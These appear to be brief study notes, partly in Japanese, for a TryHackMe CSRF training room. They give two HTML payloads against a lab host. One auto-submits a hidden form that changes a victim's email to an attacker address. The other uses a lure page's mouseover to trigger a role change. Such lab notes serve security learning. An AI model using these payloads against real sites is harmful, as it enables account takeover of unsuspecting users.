# CSRF

https://tryhackme.com/room/csrfintroduction

## example

アクセスしたら自動的にPOSTする例

```html
<html>
<body>

<form action="http://staffhub.thm:8080/update_email.php" method="POST" id="attack">
<input type="hidden" name="email" value="attacker@evilmail.thm">
</form>

<script>
document.getElementById("attack").submit();

// redirect user after the request is sent
setTimeout(function() {
    window.location.href = "http://staffhub.thm:8080/settings.php";
}, 1000);
</script>

</body>
</html>
```

img を利用した例

```html
<html>
<body>

<h2>StaffHub Internal Notice</h2>
<p>Move your mouse over the banner below to load the latest role updates.</p>

<img src="http://staffhub.thm:8080/one.png"
onmouseover="window.location='http://staffhub.thm:8080/update_role.php?role=staff&csrf_token=YWRtaW4='"
width="400">

</body>
</html>
```
